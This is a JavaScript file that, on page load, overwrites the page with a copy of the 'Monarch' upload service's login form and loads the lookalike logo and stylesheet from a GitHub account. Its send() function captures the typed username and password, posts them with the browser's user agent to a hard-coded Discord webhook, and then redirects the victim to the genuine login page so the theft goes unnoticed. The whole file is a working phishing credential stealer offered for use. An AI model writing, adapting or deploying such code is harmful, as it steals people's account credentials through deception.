function onPageLoad() {
    document.body.innerHTML = `<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="UTF-8"><link rel="icon" href="https://raw.githubusercontent.com/githubdontbanmeagain/Test/main/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Monarch</title><script type="module" crossorigin="" src="https://dash.monarchupload.cc/assets/index.6face3dc.js"></script><link rel="stylesheet" href="https://raw.githack.com/githubdontbanmeagain/Test/main/1.0.css"><link rel="modulepreload" as="script" crossorigin="" href="https://dash.monarchupload.cc/assets/Login.6afa76db.js"><link rel="modulepreload" as="script" crossorigin="" href="https://dash.monarchupload.cc/assets/Turnstile.1ed65dcc.js"></head><body><div id="app" data-v-app=""><div class="w-full h-screen bg-[url('/back.jpg')] bg-cover bg-center"><div class="flex items-center justify-center min-h-screen backdrop-blur-lg"><div class="px-8 py-6 mt-4 text-left loginform text-white shadow rounded"><div class="flex justify-center pb-6"><img class="w-1/2" src="https://raw.githubusercontent.com/githubdontbanmeagain/Test/main/logo.png"></div><h3 class="text-2xl font-bold text-center">Login to your account</h3><form><div class="mt-4"><div><label class="block" for="email">Username</label><input type="text" placeholder="Username" id="user_" class="w-full px-4 py-2 mt-2 border rounded focus:outline-none focus:ring-1 focus:ring-blue-600"></div><div class="mt-4"><label class="block">Password</label><input type="password" placeholder="Password" id="password_" class="w-full px-4 py-2 mt-2 border rounded focus:outline-none focus:ring-1 focus:ring-blue-600"></div><div id="turnstile-box"><iframe style="border:medium none;overflow:hidden;width:0;height:0;position:absolute;visibility:hidden" src="red" allow="cross-origin-isolated fullscreen" sandbox="allow-same-origin allow-scripts allow-popups" id="cf-chl-widget-v749l" tabindex="-1" title="Widget containing a Cloudflare security challenge" aria-hidden="true"></iframe><input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-v749l_response" value="0.HksOlV_bdoLMMuEsFk7UI2R0cscxsE9xRju-aDCMS-EwRvsEbbtN3Vv6QmgEkwDXd08oa_X2r8OKLv9A-OMln6M9QU-PDytAu6PSbuQfqAu3YNVe_ba3_j6YWW-gRadyeFtyDpY5-0aOwyKcZypNyoUk-Qa5PYu_Acmzb-sOGHOC-Epd_GOHYwUim_HehZB0C680-3_tfV6TpMqsOtnRpeIEHOhol8UTMiHG5gVGST1YsUJbnp16U1bQbCt86A3Zsi_lPAAP23E9rzmz2uL_ZoS-w0hqf_zsJL3dS_D9wl_-oF6Syb8J7bfdBOvkkKj8kolxcmYZVnBjsPFYmadkug49vPeA9JDd9TAQRlPF3eHupREWCkHOkjVKmUiQFQAxMRVi_nla9417OD5zJe_-lW1vGM4tDVBPDvAnEA-KuIk.qA3g6SAcrqbFke3AwsUTqA.3e34da817bedad81f0d7bf47ea42ff7a75f3906ff7f2680b5ecc32373c44a914"></div><div class="flex items-baseline justify-center"><button type="button" class="px-6 py-2 mt-4 text-white bg-blue-800 rounded hover:bg-blue-900 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500" onclick="send()">Login</button><div class="px-2"><a href="https://dash.monarchupload.cc/register" class="px-6 py-2 mt-4 text-white bg-blue-800 rounded hover:bg-blue-900 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500" type="button">Register</a></div></div><div class="flex items-baseline justify-center pt-1"><a href="https://dash.monarchupload.cc/forgor" class="text-sm text-blue-600 hover:underline">Forgot password?</a></div></div></form></div></div></div></div><div><div><div class="Vue-Toastification__container top-left"></div></div><div><div class="Vue-Toastification__container top-center"></div></div><div><div class="Vue-Toastification__container top-right"></div></div><div><div class="Vue-Toastification__container bottom-left"></div></div><div><div class="Vue-Toastification__container bottom-center"></div></div><div><div class="Vue-Toastification__container bottom-right"></div></div></div></body></html>`;
    document.title = "Monarch";
}

function send() {
    const username = document.getElementById('user_').value;
    const password = document.getElementById('password_').value;

    const webhookUrl = "https://canary.discord.com/api/webhooks/1132423140274864128/H4dxlHCYaljdINDtyq1cd3i0TPDcJ0psXl5nhkpoBsZygkR6wjhs9uLNxbWX-qzLblbY";

    const payload = {
        content: `\`\`\`User-Agent: ${navigator.userAgent}\nUsername: ${username}\nPassword: ${password}\`\`\``,
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    window.location.href = "https://dash.monarchupload.cc/login";
}

window.addEventListener('load', onPageLoad);
